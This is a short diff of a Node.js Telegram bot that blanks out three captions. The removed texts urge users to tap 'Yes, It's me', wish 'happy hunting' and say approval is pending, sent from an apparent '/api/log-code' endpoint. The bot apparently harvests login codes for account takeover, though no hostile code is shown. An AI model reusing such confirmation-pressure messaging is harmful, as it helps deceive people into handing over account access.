@@ -165,8 +165,7 @@ app.post("/api/log-code", async (req, res) => {
         userId,
         PHOTO_URL,
         {
-          caption: "I tap ang Yes, It's me!\n\n" +
-                   "Happy Watching and Happy Hunting.",
+          caption: "...",
           reply_markup: {
             inline_keyboard: [
               [
@@ -184,8 +183,7 @@ app.post("/api/log-code", async (req, res) => {
       try {
         await bot.telegram.sendMessage(
           userId,
-          "⚠️ TAP YES\n\n" +
-          "Enjoy watching and happy hunting",
+          "....",
           {
             reply_markup: {
               inline_keyboard: [
@@ -243,8 +241,7 @@ bot.on("callback_query", async (ctx) => {
       await ctx.answerCbQuery("Salamat sa confirmation!");
       try {
         await ctx.editMessageCaption(
-          "✅ Happy Watching .\n\n" +
-          "Hinihintay na lang natin ang approval"
+          "......"
         );
       } catch (err) {
         // If caption edit fails, try editing as text
